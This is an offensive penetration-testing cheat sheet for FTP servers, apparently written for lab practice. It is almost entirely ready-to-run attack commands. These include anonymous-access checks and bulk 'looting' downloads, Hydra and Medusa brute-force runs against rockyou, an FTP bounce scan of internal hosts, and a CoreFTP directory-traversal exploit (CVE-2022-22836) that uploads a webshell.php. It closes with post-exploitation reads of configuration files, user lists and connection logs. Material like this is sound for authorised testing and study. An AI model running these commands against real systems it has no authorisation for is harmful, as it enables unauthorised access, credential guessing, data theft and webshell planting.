# FTP (File Transfer Protocol)
**Default Port:** 21 (Control), 20 (Data) 
**Key Insight:** FTP sends credentials in cleartext. Always check for Anonymous login first.
### 1. Banner Grabbing & Enumeration
**Goal:** Identify the server version (vsftpd, ProFTPD, IIS) and check for anonymous access.
```shell
# Netcat Banner Grab (Fastest)
nc -nv <IP> 21

# Nmap - Check Version & Anonymous Login
# ⚠️ OPSEC: Moderate Noise.
nmap -sV -sC -p 21 <IP>

# Nmap - Full Script Trace (Debug mode)
# Useful if the script fails or hangs.
nmap -sV -p 21 --script=ftp-* -A <IP> --script-trace

# Check for Encryption (SSL/TLS)
openssl s_client -connect <IP>:21 -starttls ftp
```
### 2. Anonymous Access (The "Low Hanging Fruit")
**Description:** Many FTP servers allow login with `anonymous` : `anonymous`.
#### Manual Check (CLI)
```shell
ftp <IP>
# Name: anonymous
# Password: anonymous (or blank)

# Commands inside FTP:
ls -R          # List all files recursively
binary         # Switch to binary mode (CRITICAL for executables/images)
get file.txt   # Download
put shell.php  # Upload (if writeable)
exit
```
#### Recursive Download (Looting)
**Tool:** `wget` or `lftp` (Better/Faster)
```shell
# Wget - Download EVERYTHING
wget -m --no-passive ftp://anonymous:anonymous@<IP>

# LFTP - Mirror specific directory
lftp -u anonymous,anonymous <IP>
lftp :> mirror --parallel=10 .
```
### 3. Brute Force Attacks
**Goal:** Guess valid credentials if anonymous access fails.
#### Hydra
**Docs:** [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
```shell
# Known User (e.g., 'admin')
# -l: user | -P: password list | -f: stop on found
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# User List + Password List
hydra -L users.txt -P passwords.txt ftp://<IP>
```
#### Medusa
**Docs:** [http://foofus.net/goons/jmk/medusa/medusa.html](http://foofus.net/goons/jmk/medusa/medusa.html)
```shell
# Syntax: -u <user> -P <pass_list> -h <target> -M <module>
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```
### 4. Advanced Attacks & Exploitation
#### FTP Bounce Attack
**Description:** Use the FTP server as a proxy to scan other hosts (bypass firewall). 
**Condition:** The FTP server must support the `PORT` command.
```shell
# Scan internal port 80 on 172.17.0.2 via the FTP server
# -b: <username>:<password>@<ftp_server>
nmap -Pn -v -n -p 80 -b anonymous:password@10.10.110.213 172.17.0.2
```
#### CoreFTP / IIS Exploitation (Traversal)
**Description:** Some FTP servers allow directory traversal via `PUT` or `GET` requests.
```shell
# CoreFTP Vulnerability (CVE-2022-22836)
# Uploads a file outside the intended directory.
curl -k -X PUT -H "Host: <IP>" --basic -u <user>:<pass> --data-binary "Malicious Content" --path-as-is https://<IP>/../../../../../../webshell.php
```
### 5. Post-Exploitation (Local Enum)
**Context:** You have shell access to the server. Find config files and logs.
```shell
# Find Config Files (vsftpd, proftpd)
find / -name "vsftpd.conf" 2>/dev/null
find / -name "proftpd.conf" 2>/dev/null

# Read Configuration (Look for 'anon_upload_enable')
cat /etc/vsftpd.conf | grep -v "#"

# Check Allowed/Denied Users
cat /etc/ftpusers
cat /etc/vsftpd.user_list

# Check Logs (Who connected recently?)
# Great for finding other users' IP addresses.
cat /var/log/vsftpd.log
```